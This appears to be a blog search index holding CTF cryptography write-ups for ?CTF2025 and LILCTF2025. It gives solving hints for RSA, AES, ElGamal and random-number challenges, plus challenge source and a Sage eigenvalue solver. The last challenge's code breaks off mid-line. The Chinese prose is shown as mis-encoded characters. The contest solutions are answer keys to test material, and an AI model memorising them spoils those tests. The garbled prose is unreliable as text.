<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>?CTF2025-Crypto</title>
    <link href="/2025/10/14/ilovectf2025/"/>
    <url>/2025/10/14/ilovectf2025/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æ­¤ç¯‡æ–‡ç« åªæœ‰æ€è·¯ï¼Œæ²¡æœ‰è„šæœ¬ï¼ˆå…¶å®æ˜¯å¤ªæ‡’äº†ï¼Œè§£å‡ºæ¥å°±æ‡’å¾—å†™WPäº†ï¼Œå°±é å›å¿†äº†ï¼‰</p></blockquote><h1 id="week1"><a class="markdownIt-Anchor" href="#week1"></a> week1</h1><h2 id="basic-number-theory"><a class="markdownIt-Anchor" href="#basic-number-theory"></a> Basic Number theory</h2><p>æ ¹æ®æ¬§æ‹‰å®šç†å¾—ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mo>=</mo><mo>Â±</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">gift=Â±m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">Â±</span><span class="mord mathnormal">m</span></span></span></span>ï¼Œåˆ†åˆ«ç»™gift1ã€gift2å–æ¨¡pã€qä¸‹åï¼Œç„¶åcrtå°±å¥½äº†</p><h2 id="strange-machine"><a class="markdownIt-Anchor" href="#strange-machine"></a> Strange Machine</h2><p>æ‰‹åŠ¨æµ‹è¯•ï¼Œåå…­è½®ä¸ºä¸€ä¸ªå¾ªç¯</p><p>è®¡å¯†æ–‡ä¸ºCï¼Œé‡å¤è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œç¬¬ä¸€è½®ä¸ºAï¼Œå½“ç¬¬åä¸ƒè½®æ—¶ç»“æœåŒAï¼Œå–ç¬¬åå…­è½®ç»“æœä¸ºB</p><p>B å¼‚æˆ– è¾“å…¥çš„å­—ç¬¦ï¼ˆè®°å¾—å¡«å……ï¼‰ å¼‚æˆ– C</p><h2 id="beyondhex"><a class="markdownIt-Anchor" href="#beyondhex"></a> beyondHex</h2><p>è¶…è¶Šhexï¼Œè¿˜æœ‰å­—ç¬¦Gï¼ŒçŒœæµ‹17è¿›åˆ¶</p><p>python  long_to_bytes(int(a,17))</p><h2 id="certificate"><a class="markdownIt-Anchor" href="#certificate"></a> certificate</h2><p>æœ€å¸¸è§çš„è¯ä¹¦å½¢å¼ï¼Œå‰é¢ä¸ºæ•°æ®ä¸ºnã€eï¼Œåé¢æœ‰ä¸€é•¿ä¸²æ•°æ®åŒ…å«dp</p><p>å¯ä»¥å…ˆè¯•è¯•ç®€å•çš„ï¼ˆåº”è¯¥å§ğŸ¤“ï¼‰ï¼š<a href="https://naby1.github.io/2024/12/05/basectf2024/#%E5%93%8E%E5%91%80%E6%95%B0%E6%8D%AE%E4%B8%A2%E5%A4%B1%E4%BA%86">BaseCTF2024-Crypto-naby - Nabyçš„åšå®¢</a></p><h2 id="two-es"><a class="markdownIt-Anchor" href="#two-es"></a> two Es</h2><p>ä¸€æŠŠæ¢­<a href="https://naby1.github.io/2024/12/05/basectf2024/#exgcd">BaseCTF2024-Crypto-naby - Nabyçš„åšå®¢</a></p><h2 id="xorrsa"><a class="markdownIt-Anchor" href="#xorrsa"></a> xorRSA</h2><p>æ‰¾ä¸ªè„šæœ¬ä¸€æŠŠæ¢­</p><h1 id="week2"><a class="markdownIt-Anchor" href="#week2"></a> week2</h1><h2 id="aes_mode"><a class="markdownIt-Anchor" href="#aes_mode"></a> AES_mode</h2><p>hint32å­—èŠ‚ï¼Œkeyåªæœ‰16å­—èŠ‚ï¼Œå¼‚æˆ–åhinté«˜16å­—èŠ‚ä¿ç•™ï¼Œåˆ™å¯ä»¥å¾—åˆ°hintçš„å€¼ï¼Œä»è€Œå¾—åˆ°key</p><p>å¯†æ–‡ä¸ºCBCæ¨¡å¼åŠ å¯†ï¼Œflagä¸ºivï¼Œå³ç¬¬ä¸€è½®ä½¿ç”¨flagä½œç”¨ivå…ˆå¼‚æˆ–ç¬¬ä¸€æ®µæ˜æ–‡ä¹‹ååŠ å¯†</p><p>çŸ¥é“keyã€æ˜æ–‡ã€å¯†æ–‡ï¼Œå¯ä»¥ä½¿ç”¨ECBæ¨¡å¼ï¼Œè·å–æ¯è½®çš„ivï¼Œä»è€Œé€†æ¨</p><h2 id="common-rsa"><a class="markdownIt-Anchor" href="#common-rsa"></a> Common RSA</h2><p>æ±‚pã€qï¼šp+qçš„å¹³æ–¹æ²¡æœ‰æ¯”nå¤§å¤šå°‘ï¼Œå¾ªç¯åŠ å‡ ä¸ªnç›´æ¥å¼€æ ¹å°±å¥½äº†ï¼ˆå®æµ‹åŠ 4ä¸ªnï¼ŒåŠ 0ä¸ªnä¹Ÿèƒ½å¼€æ ¹ä½†ç»“æœå¼€å‡ºæ¥ä½æ•°å•¥çš„ä¸å¯¹ï¼‰ï¼Œä¹‹åp+qå’Œp*qè§£æ–¹ç¨‹å°±å¥½äº†</p><p>ä¹‹åä¼šå‘ç°p-1å’Œq-1è·Ÿeä¸äº’ç´ ï¼Œç›´æ¥ä¸ŠAMMè§£ï¼Œåªç”¨ä¸€ä¸ªæ•°è§£å°±å¯ä»¥äº†ï¼Œå‚è€ƒ<a href="https://naby1.github.io/2024/12/05/basectf2024/#%E3%81%AE%E6%AD%AA%E6%9D%A5">BaseCTF2024-Crypto-naby - Nabyçš„åšå®¢</a></p><h2 id="furious-blackcopper"><a class="markdownIt-Anchor" href="#furious-blackcopper"></a> Furious BlackCopper</h2><p>hint1ä¸ºpçš„ä½20ä½ï¼Œhint2ä¸ºä½830-30ä½</p><p>å¯ä»¥çˆ†ç ´20-30ä½ï¼Œç„¶åcopperé«˜194ä½</p><h2 id="baby-elgamal"><a class="markdownIt-Anchor" href="#baby-elgamal"></a> baby Elgamal</h2><p>sageç”¨discrete_log_lambdaè§£å‡ºxå°±è¡Œäº†</p><h2 id="findkey-in-middle"><a class="markdownIt-Anchor" href="#findkey-in-middle"></a> findKey in middle</h2><p>keyè¢«æ‹†æˆäº†ä¸¤ä¸ª16ä½ï¼Œæ€è·¯ä¸ºä¸­é—´ç›¸é‡</p><p>åˆ†åˆ«éå†rangeä¸ºk1å’Œk2æ±‚å¯¹åº”çš„powæ”¾åˆ°å­—å…¸ï¼ˆé”®ä¸ºiï¼Œå€¼ä¸ºpow(3æˆ–5,i,p) ï¼‰é‡Œï¼Œä¹‹åéå†k1çš„å­—å…¸ï¼Œå–æ¨¡pä¸‹çš„åä¹˜ä¸Šxï¼Œçœ‹çœ‹k2çš„å­—å…¸çš„å€¼ä¸­æ˜¯å¦å­˜åœ¨ï¼Œéå†åˆ°å³å¯å¾—åˆ°k1å’Œk2</p><h2 id="strange-random"><a class="markdownIt-Anchor" href="#strange-random"></a> strange random</h2><p>ç”¨<em>MT19937Predictor</em>ä¸€æŠŠæ¢­</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LILCTF2025</title>
    <link href="/2025/08/17/LILCTF2025/"/>
    <url>/2025/08/17/LILCTF2025/</url>
    
    <content type="html"><![CDATA[<blockquote><p>åº”è¯¥æ˜¯æœ€åä¸€åœºæ¯”èµ›äº†ï¼Œæ‹¼å°½å…¨åŠ›æ— æ³•æˆ˜èƒœ</p></blockquote><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="ez_math"><a class="markdownIt-Anchor" href="#ez_math"></a> ez_math</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;LILCTF&#123;test_flag&#125;&#x27;</span>[<span class="hljs-number">7</span>:-<span class="hljs-number">1</span>]<br>lambda1 = bytes_to_long(flag[:<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">2</span>])<br>lambda2 = bytes_to_long(flag[<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">2</span>:])<br>p = getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">vector, c</span>):<br>    <span class="hljs-keyword">return</span> [vector[<span class="hljs-number">0</span>]*c, vector[<span class="hljs-number">1</span>]*c]<br><br>v1 = [getPrime(<span class="hljs-number">128</span>), getPrime(<span class="hljs-number">128</span>)]<br>v2 = [getPrime(<span class="hljs-number">128</span>), getPrime(<span class="hljs-number">128</span>)]<br><br>A = matrix(GF(p), [v1, v2])<br>B = matrix(GF(p), [mul(v1,lambda1), mul(v2,lambda2)])<br>C = A.inverse() * B<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p = <span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;C = <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(C).replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;,&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;,&quot;</span>).replace(<span class="hljs-string">&quot;[,&quot;</span>, <span class="hljs-string">&quot;[&quot;</span>)&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æ¶è¡¥äº†ä¸‹çº¿ä»£ï¼Œéƒ½å¿˜å…‰äº†</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>B</mi><mo>=</mo><mrow><mo fence="true">âˆ£</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>Î»</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>Î»</mi><mn>2</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">âˆ£</mo></mrow><mo>âˆ—</mo><mi>A</mi><mspace linebreak="newline"></mspace><mtext>è®°ä¸ºï¼š</mtext><mi>B</mi><mo>=</mo><mi>D</mi><mo>âˆ—</mo><mi>A</mi><mspace linebreak="newline"></mspace><mtext>å¯çŸ¥ï¼š</mtext><mi>C</mi><mo>=</mo><msup><mi>A</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mi>B</mi><mo>=</mo><msup><mi>A</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mi>D</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">B=\begin{vmatrix}\lambda_1&amp;0\\0&amp;\lambda_2\\\end{vmatrix}*A\\è®°ä¸ºï¼šB=D*A\\å¯çŸ¥ï¼šC=A^{-1}B=A^{-1}DA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.42999em;vertical-align:-0.9500199999999999em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4799700000000002em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.25698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.85798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.87897em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-3.47997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">Î»</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">Î»</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4799700000000002em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.25698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.85798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.87897em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-3.47997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">è®°</span><span class="mord cjk_fallback">ä¸º</span><span class="mord cjk_fallback">ï¼š</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">çŸ¥</span><span class="mord cjk_fallback">ï¼š</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span></span></span></span></span></p><p>å› æ­¤Cå’Œæ˜¯ç›¸ä¼¼çŸ©é˜µï¼Œç‰¹å¾å€¼ç›¸åŒï¼Œä¸º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Î»</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\lambda_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">Î»</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Î»</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\lambda_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">Î»</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>æ±‚è§£ç‰¹å¾å¤šé¡¹å¼<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>e</mi><mi>t</mi><mo stretchy="false">(</mo><mi>C</mi><mo>âˆ’</mo><mi>x</mi><mi>I</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mn>2</mn></msup><mo>âˆ’</mo><mi>t</mi><mi>r</mi><mo stretchy="false">(</mo><mi>C</mi><mo stretchy="false">)</mo><mo>âˆ—</mo><mi>x</mi><mo>+</mo><mi>d</mi><mi>e</mi><mi>t</mi><mo stretchy="false">(</mo><mi>C</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">det(C-xI)=x^2-tr(C)*x+det(C)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></p><p>ç”¨sageå¾ˆå¿«å°±å‡ºæ¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>p = <span class="hljs-number">9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158191906907396234236947215466295418632056113826161</span><br>C = [<span class="hljs-number">7062910478232783138765983170626687981202937184255408287607971780139482616525215270216675887321965798418829038273232695370210503086491228434856538620699645</span>,<span class="hljs-number">7096268905956462643320137667780334763649635657732499491108171622164208662688609295607684620630301031789132814209784948222802930089030287484015336757787801</span>],[<span class="hljs-number">7341430053606172329602911405905754386729224669425325419124733847060694853483825396200841609125574923525535532184467150746385826443392039086079562905059808</span>,<span class="hljs-number">2557244298856087555500538499542298526800377681966907502518580724165363620170968463050152602083665991230143669519866828587671059318627542153367879596260872</span>]<br><br>C_matrixC=matrix(GF(p), C)<br><br>tr=C_matrixC.trace()<br>det=C_matrixC.det()<br><br>R.&lt;x&gt;=PolynomialRing(GF(p), <span class="hljs-string">&#x27;x&#x27;</span>)<br>f=x^<span class="hljs-number">2</span>-tr*x+det<br>roots=f.roots()<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(roots[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])))<br></code></pre></td></tr></table></figure><h2 id="mid_math"><a class="markdownIt-Anchor" href="#mid_math"></a> mid_math</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><br>flag = <span class="hljs-string">b&#x27;LILCTF&#123;test_flag&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">64</span>)<br>P = GF(p)<br><br>key = randint(<span class="hljs-number">2</span>**<span class="hljs-number">62</span>, p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">vector, c</span>):<br>    <span class="hljs-keyword">return</span> [vector[<span class="hljs-number">0</span>]*c, vector[<span class="hljs-number">1</span>]*c, vector[<span class="hljs-number">2</span>]*c, vector[<span class="hljs-number">3</span>]*c, vector[<span class="hljs-number">4</span>]*c]<br><br>v1 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>v2 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>v3 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>v4 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>v5 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>a, b, c, d, e = getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>),  <span class="hljs-number">0</span><br><br>A = matrix(P, [v1, v2, v3, v4, v5])<br>B = matrix(P, [mul(v1,a), mul(v2,b), mul(v3, c), mul(v4, d), 